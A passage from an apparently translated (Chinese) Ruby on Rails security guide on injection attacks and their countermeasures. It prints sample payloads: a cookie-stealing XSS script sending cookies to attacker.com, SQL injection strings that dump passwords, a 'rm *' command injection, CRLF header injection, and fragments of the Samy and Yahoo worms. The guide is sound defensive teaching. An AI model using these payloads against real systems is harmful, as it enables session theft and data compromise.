Ruby在匹配字符串的結尾和開頭方面與許多其他語言略有不同。這就是為什麼即使許多Ruby和Rails書籍也會犯這個錯誤。那麼這是一個安全威脅嗎？假設您想鬆散驗證URL字段，並且使用了一個簡單的正則表達式，如下所示：

```ruby
  /^https?:\/\/[^\n]+$/i
```

這在某些語言中可能運作良好。然而，在Ruby中，`^`和`$`匹配的是**行**的開頭和結尾。因此，像這樣的URL可以輕鬆通過過濾器：

```
javascript:exploit_code();/*
http://hi.com
*/
```

這個URL可以通過過濾器，因為正則表達式匹配了第二行，其餘部分不重要。現在想象一下，如果我們有一個視圖像這樣顯示URL：

```ruby
  link_to "Homepage", @user.homepage
```

這個鏈接對訪問者來說看起來很無害，但是當點擊它時，它將執行JavaScript函數"exploit_code"或任何其他攻擊者提供的JavaScript代碼。

要修復正則表達式，應該使用`\A`和`\z`代替`^`和`$`，如下所示：

```ruby
  /\Ahttps?:\/\/[^\n]+\z/i
```

由於這是一個常見的錯誤，格式驗證器（validates_format_of）現在如果提供的正則表達式以`^`開頭或以`$`結尾，將引發異常。如果您確實需要使用`^`和`$`而不是`\A`和`\z`（這很少見），則可以將:multiline選項設置為true，如下所示：

```ruby
  # content應該在字符串中的任何位置包含一行"Meanwhile"
  validates :content, format: { with: /^Meanwhile$/, multiline: true }
```

請注意，這只能保護您免受使用格式驗證器時最常見的錯誤影響 - 您始終需要記住，在Ruby中，`^`和`$`匹配的是**行**的開頭和結尾，而不是字符串的開頭和結尾。

### 權限提升

警告：_更改單個參數可能會給用戶未授權的訪問權限。請記住，無論您如何隱藏或混淆它，每個參數都可能被更改。_

用戶最有可能篡改的參數是id參數，例如`http://www.domain.com/project/1`，其中1是id。它將在控制器中的params中可用。在那裡，您最有可能進行以下操作：
```ruby
@project = Project.find(params[:id])
```

對於某些網路應用程式來說，這樣做是可以的，但如果使用者沒有被授權查看所有專案的話，就不適用了。如果使用者將id更改為42，而且他們沒有權限查看該資訊，他們仍然可以存取該資訊。相反地，也要「查詢使用者的存取權限」：

```ruby
@project = @current_user.projects.find(params[:id])
```

根據您的網路應用程式，使用者可能會操縱更多參數。一般原則是，「除非有證據證明否則，否則不要相信使用者輸入的資料，並且使用者的每個參數都有可能被操縱」。

不要被混淆和JavaScript安全性所迷惑。開發者工具可以檢視和更改每個表單的隱藏欄位。JavaScript可以用於驗證使用者輸入的資料，但絕對不能防止攻擊者發送帶有意外值的惡意請求。Mozilla Firefox的Firebug插件可以記錄每個請求，並且可以重複和更改它們。這是繞過任何JavaScript驗證的簡單方法。甚至還有客戶端代理可以讓您攔截從網際網路發送和接收的任何請求和回應。

注入
---------

資訊：「注入」是一類攻擊，它將惡意程式碼或參數引入網路應用程式，以在其安全環境中執行。注入的著名例子包括跨站腳本（XSS）和SQL注入。

注入非常棘手，因為相同的程式碼或參數在一個上下文中可能是惡意的，但在另一個上下文中則完全無害。上下文可以是腳本語言、查詢語言、程式語言、shell或Ruby/Rails方法。以下各節將涵蓋可能發生注入攻擊的所有重要上下文。然而，第一節涵蓋了與注入相關的架構決策。

### 允許清單與限制清單

注意：在清理、保護或驗證某些內容時，請優先使用允許清單而不是限制清單。

限制清單可以是一個壞的電子郵件地址清單、非公開的操作或壞的HTML標籤清單。相對於限制清單，允許清單列出了好的電子郵件地址、公開的操作、好的HTML標籤等等。儘管有時無法創建允許清單（例如在垃圾郵件過濾器中），但請優先使用允許清單方法：

- 對於與安全相關的操作，使用 `before_action except: [...]` 而不是 `only: [...]`。這樣您就不會忘記為新增的操作啟用安全檢查。
- 允許 `<strong>` 而不是刪除 `<script>` 以防止跨站腳本（XSS）。有關詳細資訊，請參閱下面的內容。
- 不要嘗試使用限制清單來修正使用者輸入：
    - 這樣攻擊就會成功：`"<sc<script>ript>".gsub("<script>", "")`
    - 但拒絕格式錯誤的輸入

允許清單也是對於忘記在限制清單中添加某些內容的人為因素的一種良好方法。

### SQL注入

資訊：由於Rails應用程式中的巧妙方法，這在大多數情況下不是問題。然而，這是網路應用程式中非常嚴重且常見的攻擊，因此了解問題很重要。

#### 簡介

SQL注入攻擊旨在通過操縱網路應用程式參數來影響資料庫查詢。SQL注入攻擊的一個常見目標是繞過授權。另一個目標是進行數據操作或讀取任意數據。以下是一個示例，展示了如何不在查詢中使用使用者輸入的資料：

```ruby
Project.where("name = '#{params[:name]}'")
```

這可能是在搜索操作中，使用者可能輸入他們想要查找的專案名稱。如果惡意使用者輸入 `' OR 1) --`，生成的SQL查詢將如下所示：

```sql
SELECT * FROM projects WHERE (name = '' OR 1) --')
```

兩個破折號開始一個註解，忽略其後的所有內容。因此，該查詢將返回專案表中的所有記錄，包括對使用者不可見的記錄。這是因為該條件對所有記錄都成立。

#### 繞過授權

通常，網路應用程式包括存取控制。使用者輸入他們的登錄憑證，網路應用程式嘗試在使用者表中找到匹配的記錄。當找到記錄時，應用程式授予存取權限。然而，攻擊者可能通過SQL注入繞過此檢查。以下是在Rails中查找與使用者提供的登錄憑證參數匹配的第一條記錄的典型資料庫查詢。
```ruby
User.find_by("login = '#{params[:name]}' AND password = '#{params[:password]}'")
```

如果攻擊者將`' OR '1'='1`作為名稱，並將`' OR '2'>'1`作為密碼輸入，生成的SQL查詢將如下所示：

```sql
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
```

這將簡單地在數據庫中找到第一條記錄，並授予該用戶訪問權限。

#### 未經授權的讀取

UNION語句連接兩個SQL查詢並將數據返回為一個集合。攻擊者可以使用它從數據庫中讀取任意數據。讓我們以上面的例子為例：

```ruby
Project.where("name = '#{params[:name]}'")
```

現在讓我們使用UNION語句注入另一個查詢：

```
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
```

這將導致以下SQL查詢：

```sql
SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --'
```

結果將不是項目列表（因為沒有名稱為空的項目），而是用戶名和其密碼的列表。因此，希望您在數據庫中[安全地對密碼進行哈希處理](#user-management)！對於攻擊者來說，唯一的問題是，兩個查詢中的列數必須相同。這就是為什麼第二個查詢包含一系列的1（1），這將始終是值1，以匹配第一個查詢中的列數。

此外，第二個查詢使用AS語句將某些列重命名為來自用戶表的值，以便Web應用程序顯示它們。請確保將Rails更新至至少2.1.1。

#### 對策

Ruby on Rails內置了一個過濾器，用於特殊的SQL字符，它將轉義`'`、`"`、NULL字符和換行符。*使用`Model.find(id)`或`Model.find_by_something(something)`會自動應用此對策*。但是在SQL片段中，特別是在條件片段（`where("...")`）中，必須手動應用`connection.execute()`或`Model.find_by_sql()`方法。

您可以使用位置處理程序來清理受污染的字符串，如下所示：

```ruby
Model.where("zip_code = ? AND quantity >= ?", entered_zip_code, entered_quantity).first
```

第一個參數是帶有問號的SQL片段。第二個和第三個參數將使用變量的值替換問號。

您還可以使用命名處理程序，值將從使用的哈希中獲取：

```ruby
values = { zip: entered_zip_code, qty: entered_quantity }
Model.where("zip_code = :zip AND quantity >= :qty", values).first
```

此外，您可以拆分和鏈接適用於您的用例的條件：

```ruby
Model.where(zip_code: entered_zip_code).where("quantity >= ?", entered_quantity).first
```

請注意，前面提到的對策僅適用於模型實例。您可以在其他地方嘗試[`sanitize_sql`][]。_在使用外部字符串進行SQL時，請習慣性地考慮安全後果_。


### 跨站腳本（XSS）

INFO：_跨站腳本（XSS）是Web應用程序中最常見且最具破壞性的安全漏洞之一。這種惡意攻擊注入客戶端可執行的代碼。Rails提供了幫助方法來防止這些攻擊。_

#### 入口點

入口點是一個易受攻擊的URL及其參數，攻擊者可以在其中發起攻擊。

最常見的入口點是消息發布、用戶評論和留言簿，但項目標題、文檔名稱和搜索結果頁面也可能受到攻擊 - 任何用戶可以輸入數據的地方都可能受到攻擊。但輸入的數據不一定必須來自網站上的輸入框，它可以在任何URL參數中 - 明顯的、隱藏的或內部的。請記住，用戶可能截取任何流量。應用程序或客戶端代理使更改請求變得容易。還有其他攻擊向量，如橫幅廣告。

XSS攻擊的工作方式如下：攻擊者注入一些代碼，Web應用程序保存它並在頁面上顯示它，稍後呈現給受害者。大多數XSS示例僅顯示警報框，但它比那更強大。XSS可以窃取cookie，劫持會話，將受害者重定向到假網站，顯示有利於攻擊者的廣告，更改網站上的元素以獲取機密信息，或通過Web瀏覽器中的安全漏洞安裝惡意軟件。

2007年下半年，Mozilla瀏覽器報告了88個漏洞，Safari報告了22個漏洞，IE報告了18個漏洞，Opera報告了12個漏洞。Symantec全球互聯網安全威脅報告還記錄了2007年下半年的239個瀏覽器插件漏洞。[Mpack](https://www.pandasecurity.com/en/mediacenter/malware/mpack-uncovered/)是一個非常活躍且最新的攻擊框架，它利用了這些漏洞。對於犯罪黑客來說，利用Web應用程序框架中的SQL注入漏洞並在每個文本表列中插入惡意代碼非常有吸引力。在2008年4月，超過510,000個網站遭到了這種黑客攻擊，其中包括英國政府、聯合國和許多其他知名目標。
#### HTML/JavaScript注入

最常見的XSS語言當然是最受歡迎的客戶端腳本語言JavaScript，通常與HTML結合使用。_對用戶輸入進行轉義是必不可少的_。

這是最直接的測試，用於檢查XSS：

```html
<script>alert('Hello');</script>
```

這段JavaScript代碼只會顯示一個警示框。下面的例子完全相同，只是在非常不常見的地方：

```html
<img src="javascript:alert('Hello')">
<table background="javascript:alert('Hello')">
```

##### Cookie竊取

到目前為止，這些例子都不會造成任何損害，現在讓我們看看攻擊者如何竊取用戶的Cookie（從而劫持用戶的會話）。在JavaScript中，您可以使用`document.cookie`屬性來讀取和寫入文檔的Cookie。JavaScript強制執行同源策略，這意味著來自一個域的腳本無法訪問另一個域的Cookie。`document.cookie`屬性保存了來源Web服務器的Cookie。但是，如果您直接將代碼嵌入到HTML文檔中（就像XSS一樣），則可以讀取和寫入此屬性。在您的Web應用程序的任何位置注入以下代碼，以在結果頁面上查看自己的Cookie：

```html
<script>document.write(document.cookie);</script>
```

對於攻擊者來說，這當然沒有用，因為受害者將看到自己的Cookie。下一個例子將嘗試從URL http://www.attacker.com/ 加上Cookie加載圖像。當然，這個URL不存在，所以瀏覽器不會顯示任何內容。但攻擊者可以查看他們的Web服務器訪問日誌文件，以查看受害者的Cookie。

```html
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
```

www.attacker.com上的日誌文件將顯示如下：

```
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
```

您可以通過將**httpOnly**標誌添加到Cookie來減輕這些攻擊（以明顯的方式），以便JavaScript無法讀取`document.cookie`。從IE v6.SP1、Firefox v2.0.0.5、Opera 9.5、Safari 4和Chrome 1.0.154開始，可以使用httpOnly Cookie。但是其他較舊的瀏覽器（例如WebTV和Mac上的IE 5.5）實際上可能導致頁面無法加載。請注意，使用Ajax仍然可以查看Cookie，[請參閱支持httpOnly的瀏覽器](https://owasp.org/www-community/HttpOnly#browsers-supporting-httponly)。

##### 網頁篡改

通過網頁篡改，攻擊者可以做很多事情，例如呈現虛假信息或引誘受害者進入攻擊者的網站以竊取Cookie、登錄憑據或其他敏感數據。最常見的方式是通過iframe包含來自外部源的代碼：

```html
<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
```

這將從外部源加載任意的HTML和/或JavaScript並將其嵌入到網站中。這個`iframe`來自對合法意大利網站使用[Mpack攻擊框架](https://isc.sans.edu/diary/MPack+Analysis/3015)的實際攻擊。Mpack試圖通過網頁瀏覽器中的安全漏洞安裝惡意軟件，非常成功，50%的攻擊成功。

更專門的攻擊可能會重疊整個網站或顯示一個與該站點原始頁面相同的登錄表單，但將用戶名和密碼傳輸到攻擊者的網站。或者，它可以使用CSS和/或JavaScript將合法鏈接隱藏在Web應用程序中，並在其位置顯示另一個鏈接，該鏈接重定向到假網站。

反射式注入攻擊是指有效載荷不被存儲以供以後向受害者呈現，而是包含在URL中。特別是搜索表單無法對搜索字符串進行轉義。以下鏈接呈現了一個頁面，該頁面聲稱“喬治·布什任命了一個9歲男孩為主席...”：

```
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--
```

##### 對策

_過濾惡意輸入非常重要，但同樣重要的是對Web應用程序的輸出進行轉義_。

尤其是對於XSS，重要的是進行_允許列表過濾而不是限制列表過濾_。允許列表過濾列出允許的值，而不是不允許的值。限制列表永遠不會完整。

想像一個限制列表從用戶輸入中刪除了`"script"`。現在攻擊者注入了`"<scrscriptipt>"`，過濾後，`"<script>"`仍然存在。Rails的早期版本在`strip_tags()`、`strip_links()`和`sanitize()`方法中使用了限制列表方法。因此，這種注入是可能的：

```ruby
strip_tags("some<<b>script>alert('hello')<</b>/script>")
```

這將返回`"some<script>alert('hello')</script>"`，使攻擊成功。這就是為什麼允許列表方法更好，使用更新的Rails 2方法`sanitize()`：
```ruby
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))
```

這樣只允許給定的標籤，並且對各種技巧和格式錯誤的標籤有很好的處理。

作為第二步，_在重新顯示未經過輸入過濾的用戶輸入時，最好的做法是對應用程序的所有輸出進行轉義_，特別是當重新顯示用戶輸入時。使用 `html_escape()`（或其別名 `h()`）方法將HTML輸入字符 `&`、`"`、`<` 和 `>` 替換為它們在HTML中的未解釋表示（`&amp;`、`&quot;`、`&lt;` 和 `&gt;`）。

##### 混淆和編碼注入

網絡流量主要基於有限的西方字母表，因此出現了新的字符編碼，例如Unicode，用於傳輸其他語言中的字符。但是，這對Web應用程序也構成了威脅，因為惡意代碼可以隱藏在Web瀏覽器可能能夠處理但Web應用程序可能無法處理的不同編碼中。以下是一個以UTF-8編碼的攻擊向量示例：

```html
<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
```

此示例會彈出一個消息框。但它將被上述的 `sanitize()` 過濾器識別出來。一個很好的混淆和編碼字符串的工具，因此可以“了解你的敵人”，是 [Hackvertor](https://hackvertor.co.uk/public)。Rails的 `sanitize()` 方法在防禦編碼攻擊方面做得很好。

#### 地下世界的例子

_為了理解當今對Web應用程序的攻擊，最好看一下一些現實世界的攻擊向量。_

以下是來自 [Js.Yamanner@m Yahoo! Mail worm](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=12d8d106-1137-4d7c-8bb4-3ea1faec83fa) 的摘錄。它出現於2006年6月11日，是第一個針對Webmail界面的蠕蟲：

```html
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
```

這些蠕蟲利用了Yahoo的HTML/JavaScript過濾器中的漏洞，該過濾器通常會過濾標籤中的所有目標和 onload 屬性（因為可能包含JavaScript）。然而，過濾器只應用一次，因此帶有蠕蟲代碼的 onload 屬性仍然存在。這是一個很好的例子，說明為什麼受限制的列表過濾器永遠不完整，以及為什麼在Web應用程序中允許HTML/JavaScript很困難。

另一個概念證明的Webmail蠕蟲是Nduja，它是針對四個意大利Webmail服務的跨域蠕蟲。在 [Rosario Valotta 的論文](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/) 上可以找到更多詳細信息。這兩個Webmail蠕蟲的目標是收集電子郵件地址，這是一個犯罪黑客可以賺錢的東西。

在2006年12月，有34,000個實際的用戶名和密碼在一次 [MySpace釣魚攻擊](https://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html) 中被盜取。攻擊的思路是創建一個名為 "login_home_index_html" 的個人資料頁面，使URL看起來非常可信。使用特製的HTML和CSS來隱藏頁面上真正的MySpace內容，並顯示自己的登錄表單。

### CSS注入

INFO: _CSS注入實際上是JavaScript注入，因為某些瀏覽器（IE、某些版本的Safari等）允許在CSS中使用JavaScript。在Web應用程序中，請三思而後行，是否允許自定義CSS。_

CSS注入最好通過著名的 [MySpace Samy蠕蟲](https://samy.pl/myspace/tech.html) 來解釋。這個蠕蟲只需訪問Samy（攻擊者）的個人資料頁面，就會自動向他發送好友請求。幾個小時內，他收到了超過100萬個好友請求，這導致MySpace宕機。以下是該蠕蟲的技術解釋。

MySpace封鎖了許多標籤，但允許使用CSS。因此，蠕蟲的作者將JavaScript放入CSS中，如下所示：

```html
<div style="background:url('javascript:alert(1)')">
```

因此，載荷位於style屬性中。但是，載荷中不允許使用引號，因為單引號和雙引號已經被使用了。但是JavaScript有一個方便的 `eval()` 函數，可以將任何字符串作為代碼執行。

```html
<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
```

`eval()` 函數對於受限制的列表輸入過濾器來說是一個噩夢，因為它允許style屬性隱藏單詞 "innerHTML"：

```js
alert(eval('document.body.inne' + 'rHTML'));
```

蠕蟲作者面臨的另一個問題是MySpace過濾單詞 `"javascript"`，所以作者使用 `"java<NEWLINE>script"` 來繞過這個問題：

```html
<div id="mycode" expr="alert('hah!')" style="background:url('java↵script:eval(document.all.mycode.expr)')">
```

蠕蟲作者面臨的另一個問題是 [CSRF安全令牌](#跨站請求偽造-csrf)。如果沒有這些令牌，他無法通過POST發送好友請求。他通過在添加用戶之前向該頁面發送GET請求並解析結果以獲取CSRF令牌來解決這個問題。
最後，他得到了一個4 KB的蠕蟲，並將其注入到他的個人資料頁面中。

[moz-binding](https://securiteam.com/securitynews/5LP051FHPE) CSS屬性被證明是在基於Gecko的瀏覽器（例如Firefox）中引入JavaScript到CSS的另一種方法。

#### 對策

這個例子再次顯示了一個受限制的列表過濾器永遠不完整。然而，由於網絡應用程序中的自定義CSS是一個相當罕見的功能，因此很難找到一個好的允許的CSS過濾器。如果您想允許自定義顏色或圖像，可以允許用戶選擇它們並在網絡應用程序中構建CSS。如果您真的需要一個允許的CSS過濾器，可以使用Rails的`sanitize()`方法作為模型。

### Textile注入

如果您想提供除HTML之外的文本格式（出於安全考慮），請使用一種在服務器端轉換為HTML的標記語言。[RedCloth](http://redcloth.org/)就是這樣一種用於Ruby的語言，但如果沒有預防措施，它也容易受到XSS攻擊。

例如，RedCloth將`_test_`轉換為`<em>test<em>`，使文本變斜體。然而，直到目前為止的版本3.0.4，它仍然容易受到XSS攻擊。獲取[全新的版本4](http://www.redcloth.org)，以消除嚴重的錯誤。然而，即使該版本也存在一些[安全漏洞](https://rorsecurity.info/journal/2008/10/13/new-redcloth-security.html)，因此仍然適用對策。這是版本3.0.4的一個例子：

```ruby
RedCloth.new('<script>alert(1)</script>').to_html
# => "<script>alert(1)</script>"
```

使用`:filter_html`選項來刪除不是由Textile處理器創建的HTML。

```ruby
RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
# => "alert(1)"
```

然而，這並不能過濾所有的HTML，一些標籤會被保留（出於設計考慮），例如`<a>`：

```ruby
RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
# => "<p><a href="javascript:alert(1)">hello</a></p>"
```

#### 對策

建議在對抗XSS部分中描述的對策中，_將RedCloth與允許的輸入過濾器結合使用_。

### Ajax注入

注意：_對於Ajax操作，必須採取與“正常”操作相同的安全預防措施。然而，至少有一個例外：如果操作不渲染視圖，則必須在控制器中對輸出進行轉義。_

如果您使用[in_place_editor插件](https://rubygems.org/gems/in_place_editing)，或者返回字符串而不是渲染視圖的操作，_您必須在操作中對返回值進行轉義_。否則，如果返回值包含XSS字符串，惡意代碼將在返回到瀏覽器時執行。使用`h()`方法對任何輸入值進行轉義。

### 命令行注入

注意：_謹慎使用用戶提供的命令行參數。_

如果您的應用程序需要在底層操作系統中執行命令，Ruby中有幾種方法：`system(command)`、`exec(command)`、`spawn(command)`和`` `command` ``。如果用戶可以輸入整個命令或其中一部分，您將需要特別小心這些函數。這是因為在大多數shell中，您可以在第一個命令的末尾執行另一個命令，使用分號（`;`）或垂直線（`|`）連接它們。

```ruby
user_input = "hello; rm *"
system("/bin/echo #{user_input}")
# 打印“hello”，並刪除當前目錄中的文件
```

一個對策是_使用`system(command, parameters)`方法安全地傳遞命令行參數_。

```ruby
system("/bin/echo", "hello; rm *")
# 打印“hello; rm *”，並且不刪除文件
```

#### Kernel#open的漏洞

如果參數以垂直線（`|`）開頭，`Kernel#open`將執行操作系統命令。

```ruby
open('| ls') { |file| file.read }
# 通過`ls`命令將文件列表作為字符串返回
```

對策是改用`File.open`、`IO.open`或`URI#open`。它們不執行操作系統命令。

```ruby
File.open('| ls') { |file| file.read }
# 不執行`ls`命令，只是打開`| ls`文件（如果存在）

IO.open(0) { |file| file.read }
# 打開標準輸入。不接受字符串作為參數

require 'open-uri'
URI('https://example.com').open { |file| file.read }
# 打開URI。`URI()`不接受`| ls`
```

### 標頭注入

警告：_HTTP標頭是動態生成的，在某些情況下，用戶輸入可能被注入。這可能導致虛假重定向、XSS或HTTP響應分割。_

HTTP請求標頭有Referer、User-Agent（客戶端軟件）和Cookie字段，等等。例如，響應標頭有狀態碼、Cookie和Location（重定向目標URL）字段。所有這些字段都是由用戶提供的，可能會被更多或更少的努力操縱。_請記得對這些標頭字段進行轉義。_例如，在管理區域中顯示用戶代理時。
此外，在根據使用者輸入部分建立回應標頭時，了解自己在做什麼是非常重要的。例如，您想要將使用者重新導向回特定頁面。為了做到這一點，您在表單中引入了一個 "referer" 欄位，以便重新導向到給定的地址：

```ruby
redirect_to params[:referer]
```

Rails將該字符串放入 `Location` 標頭字段中並向瀏覽器發送302（重新導向）狀態。一個惡意使用者會做的第一件事就是這樣：

```
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
```

由於（Ruby和）Rails在2.1.2版本（不包括該版本）之前存在一個錯誤，黑客可以注入任意標頭字段；例如像這樣：

```
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
```

請注意，`%0d%0a` 是對 `\r\n` 的URL編碼，而在Ruby中表示換行符（CRLF）。因此，第二個示例的HTTP標頭將如下所示，因為第二個Location標頭字段覆蓋了第一個。

```http
HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld
```

因此，標頭注入的攻擊向量是基於在標頭字段中注入CRLF字符。攻擊者可以利用錯誤的重新導向做什麼？他們可以將重定向到一個看起來與您的網站相同的釣魚網站，但要求重新登錄（並將登錄憑據發送給攻擊者）。或者他們可以通過瀏覽器安全漏洞在該網站上安裝惡意軟件。Rails 2.1.2在 `redirect_to` 方法中對Location字段進行了字符轉義。在使用使用者輸入構建其他標頭字段時，請確保自己也進行轉義。

#### DNS Rebinding 和 Host 標頭攻擊

DNS Rebinding 是一種常用的計算機攻擊形式，用於操縱域名解析。DNS Rebinding 通過濫用域名系統（DNS）來繞過同源策略。它將域名重新綁定到不同的IP地址，然後從更改後的IP地址對您的Rails應用程序執行隨機代碼，以侵害系統安全。

建議使用 `ActionDispatch::HostAuthorization` 中間件來防範 DNS Rebinding 和其他 Host 標頭攻擊。在開發環境中，它已經默認啟用，您需要在生產和其他環境中通過設置允許的主機列表來啟用它。您還可以配置例外情況並設置自己的回應應用程序。

```ruby
Rails.application.config.hosts << "product.com"

Rails.application.config.host_authorization = {
  # 排除對 /healthcheck/ 路徑的主機檢查請求
  exclude: ->(request) { request.path =~ /healthcheck/ }
  # 添加自定義的 Rack 應用程序作為回應
  response_app: -> env do
    [400, { "Content-Type" => "text/plain" }, ["Bad Request"]]
  end
}
```

您可以在 [`ActionDispatch::HostAuthorization` 中間件文檔](/configuring.html#actiondispatch-hostauthorization) 中了解更多信息。

#### 回應分割

如果標頭注入是可能的，則回應分割也可能是可能的。在HTTP中，標頭塊後面是兩個CRLF和實際數據（通常是HTML）。回應分割的想法是在標頭字段中注入兩個CRLF，然後是另一個帶有惡意HTML的回應。回應將如下所示：

```http
HTTP/1.1 302 Found [第一個標準302回應]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location:Content-Type: text/html


HTTP/1.1 200 OK [攻擊者創建的第二個新回應開始]
Content-Type: text/html


&lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [顯示為重定向頁面的任意惡意輸入]
Keep-Alive: timeout=15, max=100
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html
```

在某些情況下，這將向受害者呈現惡意HTML。但是，這似乎只適用於持久連接（許多瀏覽器使用一次性連接）。但您不能依賴於此。無論如何，這都是一個嚴重的錯誤，您應該將Rails更新到2.0.5或2.1.2版本以消除標頭注入（從而消除回應分割）的風險。

不安全的查詢生成
------------------

由於Active Record解釋參數的方式與Rack解析查詢參數的方式相結合，可能會導致使用 `IS NULL` WHERE 子句發出意外的數據庫查詢。作為對該安全問題的響應（[CVE-2012-2660](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ)、[CVE-2012-2694](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ)和[CVE-2013-0155](https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ)），引入了 `deep_munge` 方法作為默認情況下保持Rails安全的解決方案。

如果未執行 `deep_munge`，則攻擊者可以使用以下易受攻擊的代碼：

```ruby
unless params[:token].nil?
  user = User.find_by_token(params[:token])
  user.reset_password!
end
```

當 `params[:token]` 是以下之一時：`[nil]`、`[nil, nil, ...]` 或 `['foo', nil]`，它將繞過對 `nil` 的測試，但仍然會將 `IS NULL` 或 `IN ('foo', NULL)` WHERE 子句添加到SQL查詢中。
為了保持Rails的安全性，`deep_munge`會將一些值替換為`nil`。下表顯示了根據請求中發送的`JSON`所看到的參數：

| JSON                              | 參數                      |
|-----------------------------------|--------------------------|
| `{ "person": null }`              | `{ :person => nil }`     |
| `{ "person": [] }`                | `{ :person => [] }`     |
| `{ "person": [null] }`            | `{ :person => [] }`     |
| `{ "person": [null, null, ...] }` | `{ :person => [] }`     |
| `{ "person": ["foo", null] }`     | `{ :person => ["foo"] }` |

如果您了解風險並知道如何處理，可以通過配置應用程序來禁用`deep_munge`以返回到舊的行為：

```ruby
config.action_dispatch.perform_deep_munge = false
```

HTTP安全標頭
---------------------

為了提高應用程序的安全性，可以配置Rails返回HTTP安全標頭。一些標頭已經默認配置，其他標頭需要顯式配置。

### 默認安全標頭

默認情況下，Rails配置返回以下響應標頭。您的應用程序將為每個HTTP響應返回這些標頭。

#### `X-Frame-Options`

[`X-Frame-Options`][]標頭指示瀏覽器是否可以在`<frame>`、`<iframe>`、`<embed>`或`<object>`標籤中呈現頁面。默認情況下，此標頭設置為`SAMEORIGIN`，僅允許在同一域中進行框架。將其設置為`DENY`以完全禁止框架，或者完全刪除此標頭以允許在所有域上進行框架。

#### `X-XSS-Protection`

Rails默認將[已棄用的遺產標頭](https://owasp.org/www-project-secure-headers/#x-xss-protection) `X-XSS-Protection` 設置為`0`，以禁用問題的遺產XSS審計員。

#### `X-Content-Type-Options`

Rails默認將[`X-Content-Type-Options`][]標頭設置為`nosniff`。它阻止瀏覽器猜測文件的MIME類型。

#### `X-Permitted-Cross-Domain-Policies`

Rails默認將此標頭設置為`none`。它禁止Adobe Flash和PDF客戶端在其他域上嵌入您的頁面。

#### `Referrer-Policy`

Rails默認將[`Referrer-Policy`][]標頭設置為`strict-origin-when-cross-origin`。對於跨域請求，它只在Referer標頭中發送原始來源。這可以防止私有數據的洩漏，這些數據可能從完整URL的其他部分（例如路徑和查詢字符串）中訪問。

#### 配置默認標頭

這些標頭的默認配置如下：

```ruby
config.action_dispatch.default_headers = {
  'X-Frame-Options' => 'SAMEORIGIN',
  'X-XSS-Protection' => '0',
  'X-Content-Type-Options' => 'nosniff',
  'X-Permitted-Cross-Domain-Policies' => 'none',
  'Referrer-Policy' => 'strict-origin-when-cross-origin'
}
```

您可以在`config/application.rb`中覆蓋這些標頭或添加額外的標頭：

```ruby
config.action_dispatch.default_headers['X-Frame-Options'] = 'DENY'
config.action_dispatch.default_headers['Header-Name']     = 'Value'
```

或者您可以將它們刪除：

```ruby
config.action_dispatch.default_headers.clear
```

### `Strict-Transport-Security`標頭

HTTP [`Strict-Transport-Security`][]（HTST）響應標頭確保瀏覽器自動升級到HTTPS以進行當前和未來的連接。

啟用`force_ssl`選項時，將標頭添加到響應中：

```ruby
  config.force_ssl = true
```

### `Content-Security-Policy`標頭

為了防止XSS和注入攻擊，建議為應用程序定義一個[`Content-Security-Policy`][]響應標頭。Rails提供了一個DSL，允許您配置此標頭。

在適當的初始化程序中定義安全策略：

```ruby
# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.default_src :self, :https
  policy.font_src    :self, :https, :data
  policy.img_src     :self, :https, :data
  policy.object_src  :none
  policy.script_src  :self, :https
  policy.style_src   :self, :https
  # 指定違規報告的URI
  policy.report_uri "/csp-violation-report-endpoint"
end
```

全局配置的策略可以在每個資源上進行覆蓋：

```ruby
class PostsController < ApplicationController
  content_security_policy do |policy|
    policy.upgrade_insecure_requests true
    policy.base_uri "https://www.example.com"
  end
end
```

或者可以禁用它：

```ruby
class LegacyPagesController < ApplicationController
  content_security_policy false, only: :index
end
```

使用lambda表達式注入每個請求的值，例如在多租戶應用程序中的帳戶子域：

```ruby
class PostsController < ApplicationController
  content_security_policy do |policy|
    policy.base_uri :self, -> { "https://#{current_user.domain}.example.com" }
  end
end
```

#### 報告違規行為

啟用[`report-uri`][]指令將違規行為報告到指定的URI：

```ruby
